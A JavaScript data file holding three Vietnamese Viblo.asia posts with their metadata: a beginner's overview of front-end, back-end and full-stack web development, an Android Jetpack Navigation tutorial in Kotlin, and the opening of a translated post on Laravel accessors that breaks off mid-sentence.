var posts = [
    {
        "id": 38433,
        "title": "Giải mã về lập trình web: Front-End, Back-End và Full Stack",
        "slug": "07LKXmPJZV4",
        "url": "https://viblo.asia/p/giai-ma-ve-lap-trinh-web-front-end-back-end-va-full-stack-07LKXmPJZV4",
        "user_id": 39680,
        "moderation": null,
        "transliterated": "giai-ma-ve-lap-trinh-web-front-end-back-end-va-full-stack",
        "contents_short": "Lập trình web với tôi là cả một niềm đam mê, hứng khởi. Nhưng tôi từng chơi vơi, lênh đênh không biết phải bắt đầu từ đâu trong khi tôi chỉ là một chàng sinh viên nghèo tỉnh lẻ lên Sài Gòn học đại ...",
        "contents": "Lập trình web với tôi là cả một niềm đam mê, hứng khởi. Nhưng tôi từng chơi vơi, lênh đênh không biết phải bắt đầu từ đâu trong khi tôi chỉ là một chàng sinh viên nghèo tỉnh lẻ lên Sài Gòn học đại học thì lấy đâu ra tiền để tham gia các lớp tại các trung tâm đào tạo.\n\nTôi tìm kiếm thông tin từ mọi phương tiện, sách báo, bạn bè, internet...\n\nTrong đầu có muôn vạn câu hỏi: học lập trình web cần bắt đầu từ đâu?, học lập trình web cần học ngôn ngữ gì?, ...\n\nNhưng dường như rất ít các bài viết sách báo hay tài liệu ghi rõ ngọn ngành và rất nhiều bài viết thiếu xót, thông tin dễ gây hiểu nhầm.\n\nHy vọng với bài viết này bạn sẽ hiểu được bản thân cần làm gì để trở thành một lập trình web (Front-End, Back-End hay Full Stack).\n\n### 1. Website, web application.\n#### Website\nNgày xưa, khi Internet còn thô sơ, web được viết bằng html đơn lẻ. Mỗi trang web đơn lẻ được viết bằng html gọi là Web Page. Tập hợp nhiều trang web đơn lẻ, thành một trang web lớn, có chung tên miền, được gọi là Website.\n\ncác website chỉ bao gồm text, hình ảnh và video, liên kết với nhau thông qua các link. Tác dụng của website là lưu trữ và hiển thị thông tin. Người dùng chỉ có thể đọc, xem, click các link để di chuyển giữa các page.\n#### Web application\nVề sau, với sự ra đời của các ngôn ngữ server: CGI, Perl, PHP, … các website đã trở nên “động” hơn, có thể tương tác với người dùng. Từ đây, người dùng có thể dùng web để “thực hiện một công việc nào đó bằng máy tính“, do đó web app ra đời.\n\nNói dễ hiểu, web app là những ứng dụng chạy trên web. Thông qua web app, người dùng có thể thực hiện một số công việc: tính toán, chia sẻ hình ảnh, mua sắm … Tính tương tác của web app cao hơn website rất nhiều.\n\n![](https://images.viblo.asia/a5d7c2a0-1c87-4f41-b950-6b4221001a08.png)\n\nVà để một website hoạt động thì cần có 3 thành phần cơ bản: Source Code, Web hosting và domain.\n\n#### Source Code (mã nguồn):\nPhần mềm website do các lập trình viên thiết kế xây dựng. Phần này giống như bản thiết kế, vật liệu xây dựng, trang thiết bị nội ngoại thất của ngôi nhà vậy.\n#### Web hosting (Lưu trữ web):\nDùng để lưu trữ mã nguồn. Thành phần này tương tự như mảnh đất để bạn có thể xây dựng ngôi nhà. Là một dịch vụ lưu trữ nằm trên Server hoặc bạn đủ giàu có thể dùng cả Server cho website của bạn.\n\nLà trang web của bạn được đặt trên  một máy chủ cùng với nhiều trang web khác. Thông thường, các website này chia sẻ chung tài nguyên từ máy chủ như bộ nhớ RAM và CPU.\n#### Domain (Tên miền):\nLà địa chỉ của website để các máy tính ở các nơi trỏ tới khi muốn truy cập vào website. Tên miền có vai trò giống như địa chỉ ngôi nhà, dựa vào đó thì người khác mới có thể tìm tới thăm nhà bạn được.\n\n#### Server:\nMột máy chủ dùng riêng (Server) cung cấp cho bạn quyền kiểm soát hoàn toàn trên máy chủ mà bạn đặt website – Bạn được độc quyền sử dụng và hoàn toàn có thể cho những người dùng khác thuê lại. Trang web của bạn là trang web duy nhất trên máy chủ nếu bạn muốn.\n\n### 2. Lập trình website, web application.\nĐể trở thành lập trình viên website hay web application thì bạn cần biết một số điều sau:\n\nĐầu tiên web chia làm 2 thành phần chính: Front-End, Back-End.\n\nBạn có thể chọn lựa làm lập trình Front-End, lập trình Back-End hay lập trình Full Stack (là lập trình cả Front-End và Back-End).\n\n![](https://images.viblo.asia/84088c08-d62b-4a72-99c8-0d3f72fb3bbb.jpg)\n\n#### Front-End:\nPhần front-end của một trang web là phần tương tác với người dùng. Tất cả mọi thứ bạn nhìn thấy khi điều hướng trên Internet, từ các font chữ, màu sắc, hình ảnh cho tới các menu xổ xuống và các thanh trượt, là một sự kết hợp của HTML, CSS, và JavaScript được điều khiển bởi trình duyệt máy tính của bạn.\n\n#### Back-End:\nVậy điều gì giúp phần front-end của một trang web có thể hoạt động được? Tất cả dữ liệu sẽ được lưu trữ ở đâu? Đó là phần việc của back end. Phần back end của một trang web bao gồm một máy chủ, một ứng dụng, và một cơ sở dữ liệu. Một lập trình viên back-end xây dựng và duy trì công nghệ mà sức mạnh của những thành phần đó, cho phép phần giao diện người dùng của trang web có thể tồn tại được.\n\n### 3.Lập trình Front-End\nĐể trở thành một lập trình viên Front-End (Developer Front-End) thì bạn cần thuần thục 3 ngôn ngữ chính: HTML, CSS, và ngôn ngữ lập trình JavaScript. Ngoài ra lập trình viên Front-End phải làm quen với các framework như Bootstrap, Laravel, Foundation, Backbone, AngularJS, và EmberJS, để đảm bảo nội dung luôn hiển thị tốt trên mọi thiết bị khác nhau, và các thư viện như jQuery và LESS, đóng gói code vào trong một hình thức giúp tiết kiệm thời gian và hữu dụng hơn.\n#### Bắt đầu học\n##### Html\nHtml là chữ viết tắt của Hypertext Markup Language. Nó giúp người dùng tạo và cấu trúc các thành phần trong trang web hoặc ứng dụng, phân chia các đoạn văn, heading, links, blockquotes...\n\nHTML không phải là ngôn ngữ lập trình, đồng nghĩa với việc nó không thể tạo ra các chức năng “động” được. Nó chỉ giống như Microsoft Word, dùng để bố cục và định dạng trang web.\n\nKhi học HTML bạn cần chú ý:\n\n* Tìm hiểu các khái niệm cơ bản và cách viết HTML\n* Hiểu cách chia trang thành các phần và cách cấu trúc DOM đúng cách.\n\nMục tiêu:\n\n* Hãy thử ngồi xây dựng một trang html bất kỳ. Mặc nó không đẹp được như các trang web ta thường thấy nhưng quan trọng là chúng ta hướng đến đó là cấu trúc bố cục. Và hãy cố gắng nhớ được thật nhiều các thẻ của HTML.\n\n##### CSS\nCSS là ngôn ngữ tạo phong cách cho trang web – Cascading Style Sheet language. Nó dùng để tạo phong cách và định kiểu cho những yếu tố được viết dưới dạng ngôn ngữ đánh dấu, như là HTML. Nó có thể điều khiển định dạng của nhiều trang web cùng lúc để tiết kiệm công sức cho người viết web. Nó phân biệt cách hiển thị của trang web với nội dung chính của trang bằng cách điều khiển bố cục, màu sắc, và font chữ.\n\nMục tiêu:\n* Sau khi đax tạp môkt trang web bằng html, bạn hãy thử sử dụng thêm cho nó css để nó trở nên đẹp và có bố cục hơn.\n\n##### Javascript\nJavaScript là ngôn ngữ kịch bản cho phép tạo ra trang web động - cập nhật nội dung theo ngữ cảnh, điều khiển đa phương tiện, hoạt cảnh các hình ảnh và nhiều thứ hay ho khác. (Dĩ nhiên không phải mọi thứ, nhưng chỉ với một vài dòng code, JavaScript có thể làm được nhiều điều đáng kinh ngạc.)\n\nJavaScript cho phép bạn làm cho các trang HTML của bạn tương tác với thao tác của người dùng hơn. Ví dụ khi bạn đăng nhập vào một website thành công, bạn nhận được thông báo đăng nhập thành công. Thì điều đó được tạo nên từ javascript đấy\n\nSau khi học xong 3 ngôn ngữ chính (Html, CSS, Javascript) thì lúc này bạn đã đủ khả năng để học các framework, bạn hãy chọn cho mình 1 frameworl để bắt đầu, đừng quá lo lắng khi chọn framework vì khi bạn đã thuần thục Html, CSS và Javascript thì bạn sẽ đủ tư duy để bắt đầu 1 framework. Khi thuần thục 1 framework thì framework sau cũng sẽ trở nên dễ dàng với bạn.\n\n### 4. Lập trình Back-End\nĐể rở thành lập trình viên Back-End thì bạn có thể chọn học một hoặc nhiều trong những ngôn ngữ sau: Java, .NET, PHP, Python hay Ruby,… Ngoài ra do yêu cầu công việc thường xuyên phải thao tác với dữ liệu, nên những Back-end Developer cũng cần có những kiến thức về SQL và các hệ quản trị cơ sở dữ liệu như: MySQL, Oracle, và SQL Server… đây là những hệ quản trị cơ sở dữ liệu phổ biến nay.\n\n#### SQL:\nSQL là viết tắt của Structured Query Language có nghĩa là ngôn ngữ truy vấn có cấu trúc, là một ngôn ngữ máy tính để lưu trữ, thao tác và truy xuất dữ liệu được lưu trữ trong một cơ sở dữ liệu quan hệ.\n\n### 5. Full Stack\nThường thì không có sự phân biệt rõ ràng giữa phát triển Front-End và Back-End. Các lập trình viên Front-End thường cần phải tìm hiểu thêm những kỹ năng Back-End, và ngược lại các lập trình viên Back-End thường cần tìm hiểu những kỹ năng Front-End\n\nNhưng khi bạn làm Full-Stack thì đòi hỏi kiến thức của bạn đều tốt ở cả Front-End và Back-End và lương của bạn cũng cao hơn.\n\n### 6. Tổng kết\nDù Front-End hay Back-End đều có những phần cơ bản bắt buộc phải nắm vững và cũng có những phần riêng.\n\nGiữa các framework hay giữa các ngôn ngữ ở Back-End, các bạn hãy mạnh dạng chọn một framework, một ngôn ngữ để nắm thật vững. Đến lúc bạn đi làm thực tế sẽ có đủ kiến thức để làm cái đã học hoặc cũng có đủ tư duy để bắt đầu dễ dàng với một cái mới.\n\n> **Chọn lựa và bước đi, đừng do dự, đừng dẫm chân tại chỗ, nếu bước sai bạn có thể bước lại, nếu không bước đi bạn chỉ mãi đứng một chỗ.**",
        "published_at": "2020-02-12 17:13:58",
        "is_published": true,
        "updated_at": "2020-02-12 21:41:00",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 12,
        "points": -2,
        "views_count": 46,
        "clips_count": 0,
        "comments_count": 1,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/a5d7c2a0-1c87-4f41-b950-6b4221001a08.png",
        "user": {
            "data": {
                "id": 39680,
                "url": "https://viblo.asia/u/phuocquang",
                "avatar": "9bd873be-dda0-4585-820b-d546a0906496.jpg",
                "name": "Phước Quang",
                "username": "phuocquang",
                "followers_count": 1,
                "reputation": 52,
                "posts_count": 4,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "development-web",
                    "name": "Development Web",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Development+Web&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "full-stack",
                    "name": "Full Stack",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Full+Stack&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "front-end",
                    "name": "Front-end",
                    "primary": false,
                    "image": "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=Frontend&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "website",
                    "name": "Website",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Website&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "back-end",
                    "name": "Back-end",
                    "primary": false,
                    "image": "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Backend&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": [
                {
                    "id": 15351,
                    "url": "https://viblo.asia/u/nhanph",
                    "avatar": "99a31655-fc24-42e9-ade9-949584a3c819.jpg",
                    "name": "Nhân Phan  Hoàng",
                    "username": "nhanph",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                }
            ]
        }
    },
    {
        "id": 38428,
        "title": "Sử dụng thành phần kiến trúc Navigation trong Jetpack Android (Kotlin)",
        "slug": "RnB5pxgw5PG",
        "url": "https://viblo.asia/p/su-dung-thanh-phan-kien-truc-navigation-trong-jetpack-android-kotlin-RnB5pxgw5PG",
        "user_id": 536,
        "moderation": null,
        "transliterated": "su-dung-thanh-phan-kien-truc-navigation-trong-jetpack-android-kotlin",
        "contents_short": "1. Giới thiệu\n\nAndroid Jetpack là một tập hợp các components, tools giúp bạn nhanh chóng tạo ra các ứng dụng Android.\nCác components này kết hợp giữa Support Library và Architecture Components.\n\nCó...",
        "contents": "## 1. Giới thiệu\n\n[Android Jetpack](https://developer.android.com/jetpack/) là một tập hợp các components, tools giúp bạn nhanh chóng tạo ra các ứng dụng Android.\nCác components này kết hợp giữa Support Library và Architecture Components.\n\nCó thể phân loại Android Jetpack thành 4 thành phần chính :\n\n* Foumdation  (Ví dụ: ktx, appcompat, multidex, test)\n* Architecture  (Ví dụ: Data Binding, Lifecycles, ViewModel, Livedata, Room, Paging, Navigation, WorkManager)\n* Behavior  (Ví dụ: Download manager, Media, Notifications, Permissions, Sharing, Slices)\n* UI  (Ví dụ: Animations, Auto, Emoji, Fragment, Layout, Palette, TV, Wear OS )\n\n![](https://images.viblo.asia/d8e6e503-bbb7-4fdc-9a8e-772ceeeffb37.png)\n\nCác thành phần của Android Jetpack.\n\nTrong bài viết này, chúng ta sẽ tìm hiểu về [Navigation](https://developer.android.com/guide/navigation/navigation-getting-started).\n\nNavigation đề cập đến các tương tác cho phép người dùng điều hướng qua, vào và thoát ra khỏi các phần nội dung khác nhau trong ứng dụng của bạn.\n\nNavigation trong Android Jetpack giúp bạn triển khai việc điều hướng, từ việc click vào Button đơn giản cho đến các thành phần điều hướng phức tạp hơn như app bar và navigation drawer.\n\nThành phần Navigation cũng đảm bảo trải nghiệm người dùng nhất quán và có thể dự đoán được bằng cách tuân thủ các nguyên tắc đã được thiết lập.\n\nThành phần Navigation bao gồm ba phần chính được mô tả dưới đây:\n\n*  **Navigation graph:** \nFile XML chứa tất cả thông tin liên quan đến điều hướng trong một vị trí tập trung. \nNó bao gồm tất cả các khu vực nội dung riêng lẻ trong ứng dụng của bạn, được gọi là **destinations** (đích đến), cũng như các đường dẫn mà người dùng có thể đi thông qua ứng dụng của bạn.\n\n* **Navhost:**\nMột khung chứa rỗng hiển thị các đích đến từ **navigation graph** của bạn. Navigation bao gồm một khai báo Navhost mặc định, NavhostFragment, hiển thị các Fragment đích đến .\n\n* **NavController:**\nMột đối tượng quản lý điều hướng ứng dụng trong Navhost. NavControll phối hợp hoán đổi nội dung đích đến trong Navhost khi người dùng di chuyển trong ứng dụng của bạn.\n\n## 2. Thiết lập\n\nBạn cần có Android Studio 3.2 RC trở lên để sử dụng Android Jetpack bao gồm Navigation.\nNgoài ra, với phạm vi của bài viết này, kiến thức về Kotlin là bắt buộc.\n\n**Bước 1 :**\nTạo mới Android project, thêm blank activity.\n\n**Bước 2:**\nThêm các dependencies sau vào file app/build.gradle và sync project :\n\n```\ndef nav_version = \"1.0.0-alpha05\"\n    implementation \"android.arch.navigation:navigation-fragment-ktx:$nav_version\"\n    implementation \"android.arch.navigation:navigation-ui-ktx:$nav_version\"\n```\n\nThêm vào đó, để hỗ trợ việc truyền các giá trị giữa các view trong một navigation, chúng ta cần sử dụng thêm plugin typesafe.\n\nThêm **navigation-safe-args-gradle-plugin** vào file **build.gradle** của project như sau :\n\n```\nbuildscript {\n    ext.kotlin_version = '1.2.61'\n    repositories {\n        google()\n        jcenter()\n    }\n    dependencies {\n        classpath 'com.android.tools.build:gradle:3.2.0-rc02'\n        classpath \"org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version\"\n        classpath 'android.arch.navigation:navigation-safe-args-gradle-plugin:1.0.0-alpha05'\n\n        // NOTE: Do not place your application dependencies here; they belong\n        // in the individual module build.gradle files\n    }\n}\n\nallprojects {\n    repositories {\n        google()\n        jcenter()\n    }\n}\n\ntask clean(type: Delete) {\n    delete rootProject.buildDir\n}\n```\n\nTrong **app/build.gradle** , chúng ta sẽ thêm plugin như sau :\n\n```\napply plugin: 'androidx.navigation.safeargs'\n```\n\n**Bước 3:**\n\nĐể implement Navigation, Android giới thiệu một kiểu resource mới gọi là Navigation.\nClick chuột phải vào res => New => Android resource file.\nChọn title và chọn **Navigation**\n\n![](https://images.viblo.asia/5651211f-a2bb-4c2f-8838-5ecb1c8b5af3.png)\n\nFile navigation sau khi tạo xong sẽ như sau :\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<navigation xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\" android:id=\"@+id/welcome_nav_graph\">\n\n</navigation>\n```\n\n**Bước 4:**\nNếu ko tạo được Navigation, bạn hãy chọn **Enable Navigation Editor**\n\n![](https://images.viblo.asia/dd181cb3-4e38-4f20-9a1a-45863bef0157.png)\n\n**Bước 5:**\n\nTrong navigation graph xml file, tìm đến **Design** và click vào icon **New Destination** như sau :\n![](https://images.viblo.asia/773df6da-747e-4a25-9e77-c532cd994e88.png)\n\nChúng ta sẽ tạo 2 fragment bằng cách click vào **Create Blank Destination**. \nTạo **MainFragment** và **DestinationFragment**\nKhi tạo xong 2 fragment, file navigation xml sẽ như sau :\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<navigation xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:id=\"@+id/welcome_nav_graph\"\n    app:startDestination=\"@id/mainFragment\">\n\n    <fragment\n        android:id=\"@+id/mainFragment\"\n        android:name=\"com.praszapps.mysamplenavapp.MainFragment\"\n        android:label=\"fragment_main\"\n        tools:layout=\"@layout/fragment_main\" />\n    <fragment\n        android:id=\"@+id/destinationFragment\"\n        android:name=\"com.praszapps.mysamplenavapp.DestinationFragment\"\n        android:label=\"fragment_destination\"\n        tools:layout=\"@layout/fragment_destination\" />\n</navigation>\n```\n\nDesign view sẽ hiển thị như sau :\n\n![](https://images.viblo.asia/cabe31bb-6b21-451d-ad2b-8057660410f1.png)\n\n## 3. Thêm Action \nĐể framework hiểu được đích đến cần đến từ nguồn nào, bạn phải chỉ định một action.\nBạn phải thêm action tag bên trong **source/home** fragment\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<navigation xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:id=\"@+id/welcome_nav_graph\"\n    app:startDestination=\"@id/mainFragment\">\n\n    <fragment\n        android:id=\"@+id/mainFragment\"\n        android:name=\"com.praszapps.mysamplenavapp.MainFragment\"\n        android:label=\"fragment_main\"\n        tools:layout=\"@layout/fragment_main\" >\n        <action\n                   android:id=\"@+id/action_mainFragment_to_destinationFragment\"\n            app:destination=\"@id/destinationFragment\" />\n    </fragment>\n    <fragment\n        android:id=\"@+id/destinationFragment\"\n        android:name=\"com.praszapps.mysamplenavapp.DestinationFragment\"\n        android:label=\"fragment_destination\"\n        tools:layout=\"@layout/fragment_destination\" />\n</navigation>\n```\n\n## 4. Thêm Arguments\nVí dụ, bạn sẽ truyền một giá trị \"name\" từ MainFragment vào DestinationFragment, sau đó bạn sẽ hiển thị “Welcome $name”.\nBạn có thể truyền nhiều tham số như vậy.\n\nTrong file navigation xml, thêm thẻ <argument/> vào **destination** fragment.\n\n1. **android:name** - Id của tham số.\n2. **app:argType** - Kiểu dữ liệu là gì. Hiện tại đang support inferred, integer, string, reference\n3. **android:defaultValue** ( tùy chọn) - Giá trị mặc định mà fragment nhận được trong trường hợp ko source fragment ko truyền vào giá trị nào.\n\nHoàn tất, file navigation XML sẽ như sau :\n\n**welcome_nav_graph.xml **\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<navigation xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:id=\"@+id/welcome_nav_graph\"\n    app:startDestination=\"@id/mainFragment\">\n\n    <fragment\n        android:id=\"@+id/mainFragment\"\n        android:name=\"com.praszapps.mysamplenavapp.MainFragment\"\n        android:label=\"fragment_main\"\n        tools:layout=\"@layout/fragment_main\" >\n        <action\n            android:id=\"@+id/action_mainFragment_to_destinationFragment\"\n            app:destination=\"@id/destinationFragment\" />\n    </fragment>\n    <fragment\n        android:id=\"@+id/destinationFragment\"\n        android:name=\"com.praszapps.mysamplenavapp.DestinationFragment\"\n        android:label=\"fragment_destination\"\n        tools:layout=\"@layout/fragment_destination\" />\n    <argument\n    android:name=\"nameToShow\"\n    android:defaultValue=\"Andy\"\n    app:argType=\"string\" />\n</navigation>\n```\n\n## 5. Tạo XML layout\n\n**fragment_main.xml**\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:id=\"@+id/frameLayout\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\".MainFragment\">\n\n    <EditText\n        android:id=\"@+id/enterName\"\n        android:layout_width=\"match_parent\"\n        android:layout_height=\"wrap_content\"\n        android:hint=\"What is your name?\"\n        android:inputType=\"textPersonName\"\n        app:layout_constraintBottom_toBottomOf=\"parent\"\n        app:layout_constraintEnd_toEndOf=\"parent\"\n        app:layout_constraintStart_toStartOf=\"parent\"\n        app:layout_constraintTop_toTopOf=\"parent\" />\n\n    <Button\n        android:id=\"@+id/buttonWelcomeMe\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        android:layout_marginStart=\"8dp\"\n        android:layout_marginTop=\"8dp\"\n        android:layout_marginEnd=\"8dp\"\n        android:layout_marginBottom=\"148dp\"\n        android:text=\"Welcome Me\"\n        app:layout_constraintBottom_toBottomOf=\"parent\"\n        app:layout_constraintEnd_toEndOf=\"parent\"\n        app:layout_constraintStart_toStartOf=\"parent\"\n        app:layout_constraintTop_toBottomOf=\"@+id/enterName\" />\n\n</android.support.constraint.ConstraintLayout>\n```\n\n**fragment_destination.xml **\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:id=\"@+id/frameLayout2\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\".DestinationFragment\">\n\n    <TextView\n        android:id=\"@+id/welcomeWithNameTv\"\n        android:layout_width=\"wrap_content\"\n        android:layout_height=\"wrap_content\"\n        tools:text=\"Hello Andy!\"\n        app:layout_constraintBottom_toBottomOf=\"parent\"\n        app:layout_constraintEnd_toEndOf=\"parent\"\n        app:layout_constraintStart_toStartOf=\"parent\"\n        app:layout_constraintTop_toTopOf=\"parent\" />\n\n</android.support.constraint.ConstraintLayout>\n```\n\n**activity_main.xml**\n\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<android.support.constraint.ConstraintLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    xmlns:app=\"http://schemas.android.com/apk/res-auto\"\n    android:id=\"@+id/fragment_container\"\n    xmlns:tools=\"http://schemas.android.com/tools\"\n    android:layout_width=\"match_parent\"\n    android:layout_height=\"match_parent\"\n    tools:context=\".MainActivity\">\n\n</android.support.constraint.ConstraintLayout>\n```\n\n## 6. Coding\n**1. MainActivity**\n\nMainActivity.kt\n\n```\nimport android.support.v7.app.AppCompatActivity\nimport android.os.Bundle\nimport androidx.navigation.fragment.NavHostFragment\n\nclass MainActivity : AppCompatActivity() {\n\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        setContentView(R.layout.activity_main)\n        val host = NavHostFragment.create(R.navigation.welcome_nav_graph)\n        supportFragmentManager.beginTransaction().replace(R.id.fragment_container, host).setPrimaryNavigationFragment(host).commit()\n    }\n}\n```\n\n**2. MainFragment**\n\nMainFragment.kt \n\n```\nimport android.os.Bundle\nimport android.support.v4.app.Fragment\nimport android.view.LayoutInflater\nimport android.view.View\nimport android.view.ViewGroup\nimport androidx.navigation.fragment.findNavController\nimport kotlinx.android.synthetic.main.fragment_main.*\n\nclass MainFragment : Fragment() {\n\n    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?,\n                              savedInstanceState: Bundle?): View? {\n        // Inflate the layout for this fragment\n        return inflater.inflate(R.layout.fragment_main, container, false)\n    }\n\n    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {\n        super.onViewCreated(view, savedInstanceState)\n\n        // Sending data from one fragment to another fragment\n        buttonWelcomeMe.setOnClickListener{\n\n            val name = enterName.text.toString()\n            if(name.isEmpty()) {\n                enterName.error = \"Please enter a name\"\n            } else {\n                val action = MainFragmentDirections.actionMainFragmentToDestinationFragment()\n                action.setNameToShow(name)\n                findNavController().navigate(action)\n            }\n        }\n    }\n\n\n}\n```\n\n**3. DestinationFragment**\n\nDestinationFragment.kt \n\n```\nimport android.os.Bundle\nimport android.support.v4.app.Fragment\nimport android.view.LayoutInflater\nimport android.view.View\nimport android.view.ViewGroup\nimport kotlinx.android.synthetic.main.fragment_destination.*\n\nclass DestinationFragment : Fragment() {\n\n    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?,\n                              savedInstanceState: Bundle?): View? {\n        // Inflate the layout for this fragment\n        return inflater.inflate(R.layout.fragment_destination, container, false)\n    }\n    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {\n        super.onViewCreated(view, savedInstanceState)\n\n        val name = DestinationFragmentArgs.fromBundle(arguments).nameToShow\n        welcomeWithNameTv.text = \"Hello $name!\"\n    }\n\n}\n```\n\n## 7. Kết luận\n\nChạy app và chúng ta sẽ có kết quả như sau :\n\n![](https://images.viblo.asia/312079ca-f754-4602-8a47-b13612a6088e.gif)",
        "published_at": "2020-02-12 16:03:04",
        "is_published": true,
        "updated_at": "2020-02-12 21:34:00",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 4,
        "points": 1,
        "views_count": 16,
        "clips_count": 0,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "en",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/d8e6e503-bbb7-4fdc-9a8e-772ceeeffb37.png",
        "user": {
            "data": {
                "id": 536,
                "url": "https://viblo.asia/u/bui.huu.tuan",
                "avatar": "48521ea9-cc68-4eba-9280-1c3d9aaa0c9a.jpg",
                "name": "Bui Huu Tuan",
                "username": "bui.huu.tuan",
                "followers_count": 26,
                "reputation": 699,
                "posts_count": 53,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "android",
                    "name": "Android",
                    "primary": false,
                    "image": "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=Android&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "android-2020",
                    "name": "Android 2020",
                    "primary": false,
                    "image": "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=Android+2020&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38420,
        "title": "Một số vấn đề với Accessor Laravel",
        "slug": "Do754bmWZM6",
        "url": "https://viblo.asia/p/mot-so-van-de-voi-accessor-laravel-Do754bmWZM6",
        "user_id": 260,
        "moderation": null,
        "transliterated": "mot-so-van-de-voi-accessor-laravel",
        "contents_short": "Giới thiệu\n- Với những người sử dụng Laravel framework, thì accessor và mutator không quá khó hiểu và đôi khi, cũng được sử dụng ở trong thực tế. Ngay cả bản thân tôi cũng sử dụng Accessor và Mutat...",
        "contents": "## Giới thiệu \n- Với những người sử dụng Laravel framework, thì accessor và mutator không quá khó hiểu và đôi khi, cũng được sử dụng ở trong thực tế. Ngay cả bản thân tôi cũng sử dụng Accessor và Mutator trong dự án thực tế. Tuy nhiên, cũng như hầu hết các phương thức, cơ chế khác. Accessor và Mutator sẽ hơi có vẻ magic với những người mới sử dụng hoặc chưa quen thuộc với Laravel framework. Nhắc đến \"magic\", tôi lại nhớ những ngày bắt đầu học lập trình với sự \"magic\" của ruby on rails. Không thể hiểu thực sự cơ chế bên trong \"nó\" xử lý như thế nào, không hiểu tại sao ở một cách kỳ lạ nào đó \"nó\" lại hoạt động, và thực tế là khi có lỗi, cũng không thể thực hiện việc debug để hiểu tại sao nó lỗi. Với những người mới chập chững vào nghề như tôi hồi đó, nó thật khó hiểu vì hai chữ \"magic\" được nhắc đi nhắc lại nhiều lần. \n- Tuy nhiên, cũng với kinh nghiệm tăng dần, hoặc là khi dần quen thuộc hơn, thì các khái niệm accessor, mutator sẽ dễ dàng hiểu được hơn, nhất là khi đã thực sự đã sử dụng nó. Với laravel, thì accessor và mutator còn có trong document hẳn hoi trên trang chủ, nên thông qua những ví dụ, những giải thích của document, và thực tế sử dụng, thì acessor và mutator không còn quá \"magic\" như trước nữa. Tuy nhiên, đi dạo một vòng thấy một bài về \"một số vấn đề\" khi sử dụng \"accessor\", tôi thấy hay nên quyết định translate nó. Trong bài viết này, chỉ đề cập đến vấn đề của \"accessor\" thôi nhé, còn mutator sẽ được đề cập trong một nội dung khác. \n- Bài viết gốc các bạn có thể đọc [tại đây](https://laraveldaily.com/the-biggest-problem-with-eloquent-accessors-magic/).  Bài này mình chỉ dịch theo ý hiểu từ bài viết gốc. Không có gì cao siêu cả. \n## Nội dung\n### Accessor là gì ? \n- Trên viblo, có nhiều bài viết về accessor và mutator trong laravel. Vì accessor và mutator là 2 chiều lấy dữ liệu/ lưu dữ liệu vào trong cơ sở dữ liệu 